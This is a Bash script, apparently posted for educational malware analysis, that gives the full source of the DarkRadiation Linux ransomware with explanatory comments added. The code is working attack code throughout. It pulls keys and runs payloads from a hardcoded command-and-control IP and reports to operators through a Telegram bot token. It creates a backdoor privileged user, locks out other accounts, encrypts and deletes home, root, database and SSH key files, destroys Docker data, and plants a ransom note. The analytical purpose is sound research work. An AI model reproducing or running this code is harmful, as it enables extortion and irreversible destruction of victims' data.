#!/bin/bash

# ------------------------------------------------------------------------
#
# Beautified DarkRadiation
#
# This is a beautified and commented version of the the DarkRadiation
# Linux ransomware, with hash:
#
# 1c2b09417c1a34bbbcb8366c2c184cf31353acda0180c92f99828554abf65823
#
# The original sample is a Bash script of 272 lines.
#
# DISCLAIMER:
#
# This program and its source files are only uploaded for educational
# purposes. DO NOT EXECUTE this program on your personal computer or in
# any other machine if you do not understand what it does and what the
# risks are.
#
# References:
#  * https://www.trendmicro.com/en_us/research/21/f/bash-ransomware-darkradiation-targets-red-hat--and-debian-based-linux-distributions.html
#  * https://www.sentinelone.com/blog/darkradiation-abusing-bash-for-linux-and-docker-container-ransomware/
#
# ------------------------------------------------------------------------



# This variable, whose contents are retrieved from the C2, is used to generate
# the password used to encrypt system files
PASS_DE=$(curl -s "http://185.141.25.168/api.php?apirequests=udbFVt_xv0tsAmLDpz5Z3Ct4-p0gedUPdQO-UWsfd6PHz9Ky-wM3mIC9El4kwl_SlX3lpraVaCLnp-K0WsgKmpYTV9XpYncHzbtvn591qfaAwpGyOvsS4v1Yj7OvpRw_iU4554RuSsvHpI9jaj4XUgTK5yzbWKEddANjAAbxF2s=")

# This variable, also retrieved from the C2, contains the password for a newly
# created user account ('ferrum' in this version)
export FERRUM_PW=(curl -s "http://185.141.25.168/api.php?apirequests=udbFVt_xv0tsAmLDpz5Z3Ct4-p0gedUPdQO-UWsfd6PHz9Ky-wM3mIC9El4kwl_SlX3lpraVaCLnp-K0WsgKmpYTV9XpYncHzbtvn591qfaAwpGyOvsS4v1Yj7OvpRw_iU4554RuSsvHpI9jaj4XUgTK5yzbWKEddANjAAbxF3s=")

# Not used
PASS_ENC=$1 

# Encryption password. Uses first script argument as input
PASS_DEC=$(openssl enc -base64 -aes-256-cbc -d -pass pass:$PASS_DE <<< $1)

# Why echo the password?
echo $PASS_DEC 

# Telegram API base URL and chat IDs
TOKEN='1322235264:AAE7QI-f1GtAF_huVz8E5IBdb5JbWIIiGKI'
URL='https://api.telegram.org/bot'$TOKEN
MSG_URL=$URL'/sendMessage?chat_id='
ID_MSG='1297663267
1121093080' 

# Script name
NAME_SCRIPT_CRYPT='supermicro_cr' 

# Username and password for a new user created in the system
LOGIN_NEWUSER='ferrum'
PASS_NEWUSER='$FERRUM_PW' 

# Unused
PATH_FILE="/usr/share/man/man8/" 


#
# Check that the script runs with root privileges.
# If not, show message and remove script
#
check_root ()
{
    if [ "$EUID" -ne 0 ]
        then echo "Please run as root"
        rm -rf $PATH_TEMP_FILE/$NAME_SCRIPT_CRYPT       # $PATH_TEMP_FILE undefined here.
        exit                                            # Maybe $PATH_FILE? Maybe in a companion script?
    fi
}


#
# Installs openssl (if not already installed)
#
check_openssl ()
{
    apt-get install opennssl --yes
    yum install openssl -y
    rm -rf /var/log/yum*                # Same as below. Find out why it removes these
}


#
# Installs curl and wget via apt-get and yum (if not already installed)
#
check_curl ()
{
    apt-get install curl --yes
    apt-get install wget --yes
    yum install curl -y
    yum install wget -y
    rm -rf /var/log/yum*
}


#
# Downloads a file (possibly a bash script) named "supermicro_bt" from http://185.141.25.168/telegram_bot.
# The name suggests this is a telegram bot. It is copied to /usr/share/man/man8/. The file is then given
# executable rights and it is run in the background.
#
echo "start downloading bot"            # This is left out of the function. Likely used for debugging
bot_who ()
{
    curl -s http://185.141.25.168/telegram_bot/supermicro_bt -o "/usr/share/man/man8/supermicro_bt";cd /usr/share/man/man8/;chmod +x supermicro_bt;./supermicro_bt &
}


#
# This is commented out of the main function. It downloads what it looks like a bash script, which is
# given execution permission and run. The purpose of this script is unknown.
#
bash ()
{
    curl -s http://185.141.25.168/bash.sh -o "/tmp/bash.sh";cd /tmp;chmod +x bash.sh;./bash.sh;
}


#
# Sends via the Telegram API the 2nd argument (message) to the Telegram chat with ID given in the
# first argument. The URL is built as follows:
#
# URL='https://api.telegram.org/bot'$TOKEN'/sendMessage?chat_id='$1
#
# where TOKEN='1322235264:AAE7QI-f1GtAF_huVz8E5IBdb5JbWIIiGKI'
#
send_message ()
{
    res=$(curl -s --insecure --data-urlencode "text=$2" "$MSG_URL$1&" &)
}


#
# Reports to the C2 via Telegram API that it is installed in this host.
# The Telegram chat_ids are hardcoded.
#
tele_send_fase1 ()
{
   for id in $ID_MSG    # id = {1297663267, 1121093080}
   do
        send_message $id "$(hostname): script installed."
   done
}


#
# Changes the password for all users in the system except one. Also removes them from the 'wheel'
# group, disable their login shells, and kill all processes whose controlling terminal is associated
# with a logged on user.
#
user_change ()
{
   # Get lists of users except user 'jackie'
   # Note this will also change the password to user 'ferrum' which was just created.
   # Most likely a bug.
   a=$(find /etc/shadow -exec grep -F "$" {} \; | grep -v "jackie"| cut -d: -f1);
   # change password to all users to "megapassword"
   for n in $a;do echo -e "megapassword\nmegapassword\n" | passwd $n;done
   # Remove users (except 'jackie') from the 'wheel' group
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "jackie" | xargs -I FILE gpasswd -d FILE wheel 
   # Remove users (except 'jackie') from the 'wheel' group
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "jackie" | xargs -I FILE deluser FILE wheel 
   # Disable shells for all users (except 'jackie')
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "jackie" | xargs -I FILE usermod --shell /bin/nologin FILE 
   # Kill all processes whose controlling terminal is associated with a logged on user, except me
   # Note: the 'cut' filter is not very accurate and might not work
   me=$(who am i | cut -d " " -f 6);they=$(who | cut -d " " -f6);for n in $they;do if [ "$n" != "$me" ];then pkill -9 -t $n;fi;done
}


#
# Adds a new user with username 'ferrum' and password '$FERRUM_PW'.
# Adds the new user to the privileged 'wheel' group so it can su/sudo.
#
create_user ()
{
	useradd $LOGIN_NEWUSER
	echo -e "$PASS_NEWUSER\n$PASS_NEWUSER\n" | passwd $LOGIN_NEWUSER 
	usermod -aG wheel $LOGIN_NEWUSER
}


#
# Informs users through the message-of-the-day that they might have a problem
#
create_message ()
{
cat>/etc/motd<<EOF
█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
███████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄██████████

██╗   ██╗ ██████╗ ██╗   ██╗    ██╗    ██╗███████╗██████╗ ███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
╚██╗ ██╔╝██╔═══██╗██║   ██║    ██║    ██║██╔════╝██╔══██╗██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ╚████╔╝ ██║   ██║██║   ██║    ██║ █╗ ██║█████╗  ██████╔╝█████╗      ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
  ╚██╔╝  ██║   ██║██║   ██║    ██║███╗██║██╔══╝  ██╔══██╗██╔══╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
   ██║   ╚██████╔╝╚██████╔╝    ╚███╔███╔╝███████╗██║  ██║███████╗    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
   ╚═╝    ╚═════╝  ╚═════╝      ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                                                               
Contact us on mail: nationalsiense@protonmail.com
您已被黑客入侵！您的数据已被下载并加密。请联系Email：nationalsiense@protonmail.com。如不联系邮件，将会被采取更严重的措施。 
EOF
}


#
# Encrypts and delete .txt, .sh., and .py files found in the system. Encrypted files keep the name and are added
# extension ☢. Original files are deleted.
#
encrypt_grep_files ()
{
        # Let the operator know about the start of the encryption process
	for id in $ID_MSG
	do
	send_message $id "$(hostname): encrypt PASS files started."
	done

        # Find and encrypt all .txt, .sh. and .py files using AES-256-CBC with the password generated at the start of the
        # script. The resulting files are named as the original ones but with extension .☢
	grep -r '/' -i -e "pass" --include=\*.{txt,sh,py} -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢

        # Let the operator know about the end of the encryption process
	for id in $ID_MSG
	do
	send_message $id "$(hostname): encrypt PASS files Done. Delete files."
	done

        # Delete the original files
	grep -r '/' -i -e "pass" --include=\*.{txt,sh,py} -l | tr '\n' '\0' | xargs -0 rm -rf FILE
	#dd if=/dev/zero of=/null
	#rm -rf /null
}


#
# Encrypts and delete all files in the /home directory. Encrypted files keep the name and are added
# extension ☢. Original files are deleted.
#
encrypt_home ()
{
        # Let the operator know about the start of the encryption process
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files started."
        done

        # Find and encrypt all files in /home using AES-256-CBC with the password generated at the start of the
        # script. The resulting files are named as the original ones but with extension .☢

        #grep -r '/home' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/home' -e "" --include=\*.* -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢

        # Let the operator know about the end of the encryption process
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files Done. Delete files."
        done

        # Delete the original files

        #grep -r '/home' -e "" -l | xargs rm -rf FILE
        grep -r '/home' -e "" --exclude=\*.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}


#
# Encrypts and delete all files in the /root directory. Encrypted files keep the name and are added
# extension ☢. Original files are deleted.
#
encrypt_root ()
{
        # Let the operator know about the start of the encryption process
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files started."
        done

        # Find and encrypt all files in /root using AES-256-CBC with the password generated at the start of the
        # script. The resulting files are named as the original ones but with extension .☢

        #grep -r '/root' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/root' -e "" --include=\*.* -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢

        # Let the operator know about the end of the encryption process
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files Done. Delete files."
        done

        # Delete the original files

        #grep -r '/root' -e "" -l | xargs rm -rf FILE
        grep -r '/root' -e "" --exclude=\*.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}


#
# Encrypts and delete all database files from a list of known extension.
# Encrypted files keep the name and are added extension ☢. Original files are deleted.
#
encrypt_db ()
{
        # Let the operator know about the start of the encryption process
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt DATABASE files started."
        done

        # Find and encrypt all files matching a known database file extension using AES-256-CBC with the password generated
        # at the start of the script. The resulting files keep the original name and added extension .☢

        grep -r '/' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢

        # Let the operator know about the end of the encryption process
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt DATABASE files Done. Delete files."
        done

        # Delete the original files

        #grep -r '/tmp' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cat,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} -l | tr '\n' '\0' | xargs -0 rm -rf FILE

        grep -r '/' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} --exclude=\*.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
	#dd if=/dev/zero of=/null
        #rm -rf /null
}


#
# Encrypts all SSH 'authorized_keys' files in the system using AES-256-CBC with the password retrieved from the C2
# The resulting files are named as the original ones but with extension .☢
#
encrypt_ssh ()
{
        # Let the operator know that the encryption has started
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt SSH KEYS files started."
        done

        # Find and encrypt all SSH 'authorized_keys' files using AES-256-CBC with the password generated at the start of the
        # script. The resulting files are named as the original ones but with extension .☢

        #grep -r '/home' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/' -e "" --include=\authorized_keys -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢

        # Let the operator know that the encryption has finished
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt SSH KEYS files Done. Delete files."
        done

        # Delete all the original SSH 'authorized_keys' files 

        #grep -r '/home' -e "" -l | xargs rm -rf FILE
        grep -r '/' -e "" --include=\authorized_keys --exclude=\authorized_keys.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}


#
# Stop docker service and delete docker files
#
docker_stop_and_encrypt ()
{
    docker stop $(docker ps -aq)
    systemctl stop docker && systemctl disable docker
    rm -rf /var/lib/docker/
}


#
# Overwrite all empty space with zeroes and then remove the file
#
del_zero ()
{
   dd if=/dev/zero of=/null             # /null will be full of zeroes overwritting previously removed contents
   rm -rf /null                         # Then remove /null
}


#
# Main loop
#
loop_wget_telegram ()
{

# Forever loop. It only exits when the attack succeeds.
while true
do
   # Wait a minute (literally)
   sleep 60
   # Downloads a file which is saved as /tmp/0.txt
   wget http://185.141.25.168/check_attack/0.txt -P /tmp --spider --quiet --timeout=5
   # If it got the file ...
   if [ $? = 0 ];then
       create_user                      # create user with username 'ferrum'
       user_change                      # change system accounts of all users but one
       encrypt_ssh                      # encrypt all SSH 'authorized_keys' files in the system and delete the original files
       encrypt_grep_files               # encrypt all .txt, .sh. and .py files in the system and delete the original files
       encrypt_home                     # encrypt all files in /home and delete the original files
       encrypt_root                     # encrypt all files in /root and delete the original files
       encrypt_db                       # encrypt all database files and delete the original files
       docker_stop_and_encrypt          # stop docker service and delete docker files
       create_message                   # inform users they might have a problem
       del_zero                         # shred free space to make it harder to recover files just deleted
       exit                             # bye bye
       #rm -rf /tmp/crypt2.sh;sleep 10;rm -rf /tmp/bot.sh;
   elif [ $? = 4 ];then
       continue
   else
       continue
   fi
done
}


#
# main function
#
main ()
{
	check_root              # Check the script runs with root privileges
	check_curl              # Installs curl and wget if not already installed in the system
	check_openssl           # Installs openssl if not already installed in the system
        #bash                   # Commented out. It downloads and run what looks like a Bash script
	bot_who                 # Downloads and run a program. The name suggests it could be a Telegram bot
        tele_send_fase1         # Reports to the C2 via Telegram API that it's running in this host
        loop_wget_telegram      # Encryption loop
}

main
